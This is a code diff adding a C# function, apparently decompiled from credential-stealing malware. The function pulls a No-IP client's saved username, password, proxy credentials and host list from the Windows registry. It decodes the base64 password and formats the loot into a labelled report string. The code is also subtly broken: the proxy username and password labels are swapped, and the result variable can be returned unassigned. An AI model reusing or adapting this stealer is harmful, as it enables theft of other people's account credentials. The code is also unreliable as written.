@@ -1,0 +1,40 @@
+// Ftp
+public static string SNoip()
+{
+	string password = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "Password", null));
+	string text = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "Checked", null));
+	string text2 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "Username", null));
+	string text3 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "ProxyUsername", null));
+	string text4 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "ProxyPassword", null));
+	string text5 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC\\", "Hosts", null));
+	bool flag = Operators.CompareString(text2, "", false) != 0;
+	string result;
+	if (flag)
+	{
+		try
+		{
+			result = string.Concat(new string[]
+			{
+				"Aktivierte Hosts: ",
+				text,
+				"\r\nAlle Hosts: ",
+				text5,
+				"\r\nUsername: ",
+				text2,
+				"\r\nPassword: ",
+				Ftp.FromBase64(password),
+				"\r\nProxy Username: ",
+				text4,
+				"\r\nProxy Password: ",
+				text3,
+				"<br />"
+			});
+		}
+		catch (Exception expr_16C)
+		{
+			ProjectData.SetProjectError(expr_16C);
+			ProjectData.ClearProjectError();
+		}
+	}
+	return result;
+}
